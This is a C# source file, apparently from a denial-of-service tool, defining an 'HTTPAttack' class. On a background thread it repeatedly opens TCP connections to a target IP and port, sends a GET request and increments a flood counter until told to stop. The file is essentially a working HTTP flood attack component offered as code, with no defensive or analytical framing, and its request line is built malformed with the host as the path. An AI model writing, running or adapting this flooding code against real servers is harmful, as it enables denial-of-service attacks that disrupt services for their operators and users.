using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Noah.Attacks
{
    /// <summary>
    /// Class for an HTTP attack.
    /// </summary>
    public class HTTPAttack : IAttack
    {
        /// <summary>
        /// The Attack Name.
        /// </summary>
        public string AttackName { get; private set; }

        private string message;
        private ApplicationState state;
        private string ip;
        private int port;
        /// <summary>
        /// Initializes a new HTTP Attack.
        /// </summary>
        /// <param name="state">The Application State.</param>
        /// <param name="host">The IP to target.</param>
        /// <param name="port">The port to target.</param>
        public HTTPAttack(ApplicationState state, string host, int port = 80)
        {
            StringBuilder sb = new StringBuilder("GET ");
            sb.Append(host);
            sb.AppendLine(" HTTP/1.1");

            message = sb.ToString();
            this.state = state;
            ip = host;
            this.port = port;
        }
        /// <summary>
        /// Starts the attack on a new thread.
        /// </summary>
        public void BeginAttack()
        {
            new Thread(() => attack()).Start();
        }

        private void attack()
        {
            // Change the state to an attack mode.
            state.State = States.Attacking;
            // Turn the GET request into a byte array.
            byte[] bytes = Encoding.ASCII.GetBytes(message);

            // Loop until the overlord thread in Application State tells us to be done.
            while (state.State != States.Done)
            {
                // Using will dispose of the socket.
                using (Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
                {
                    // Speed bost.
                    sock.NoDelay = true;
                    sock.Connect(ip, port);
                    // Send the GET request.
                    sock.Send(bytes, SocketFlags.None);
                }
                // Sleep between ticks.
                Thread.Sleep(state.Delay);
                // Increment the flood count.
                state.FloodCount++;
            }
        }
    }
}